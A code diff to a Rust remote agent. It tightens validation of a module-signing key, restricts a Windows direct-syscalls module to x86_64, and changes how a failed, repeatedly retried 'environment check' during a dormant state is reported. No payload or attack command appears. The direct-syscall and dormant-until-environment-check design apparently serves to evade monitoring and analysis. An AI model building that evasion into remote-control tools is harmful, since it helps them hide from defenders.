@@ -20,7 +20,7 @@ pub mod remote_assist;
 #[cfg(feature = "hci-research")]
 pub mod hci_logging;
 
-#[cfg(all(windows, feature = "direct-syscalls"))]
+#[cfg(all(windows, target_arch = "x86_64", feature = "direct-syscalls"))]
 pub mod syscalls;
 
 use anyhow::Result;
@@ -48,13 +48,24 @@ impl Agent {
             use base64::Engine;
             let bytes = base64::engine::general_purpose::STANDARD
                 .decode(b64)
-                .unwrap_or_else(|_| vec![0u8; 32]);
+                .map_err(|e| anyhow::anyhow!(
+                    "module_signing_key in agent.toml is not valid base64: {}. \
+                     Provide a valid 32-byte base64-encoded key or remove the field \
+                     to disable module signature verification.",
+                    e
+                ))?;
+            if bytes.len() != 32 {
+                return Err(anyhow::anyhow!(
+                    "module_signing_key must decode to exactly 32 bytes, got {} byte(s). \
+                     Re-generate the key with the `keygen` tool.",
+                    bytes.len()
+                ));
+            }
             let mut key = [0u8; 32];
-            let len = bytes.len().min(32);
-            key[..len].copy_from_slice(&bytes[..len]);
+            key.copy_from_slice(&bytes);
             key
         } else {
-            [0u8; 32] // insecure default; fine for development
+            [0u8; 32] // insecure default; acceptable for development builds
         };
 
         Ok(Self {
@@ -107,8 +118,11 @@ impl Agent {
                     }
                     retries += 1;
                     if retries >= MAX_RETRIES {
-                        info!("maximum dormant retries ({}) reached; exiting for supervisor restart", MAX_RETRIES);
-                        return Ok(());
+                        error!("maximum dormant retries ({}) reached; returning error so reconnect loop retries", MAX_RETRIES);
+                        return Err(anyhow::anyhow!(
+                            "Environment check failed permanently after {} retries",
+                            MAX_RETRIES
+                        ));
                     }
                     error!(
                         "environment re-check failed ({}/{}); remaining dormant",
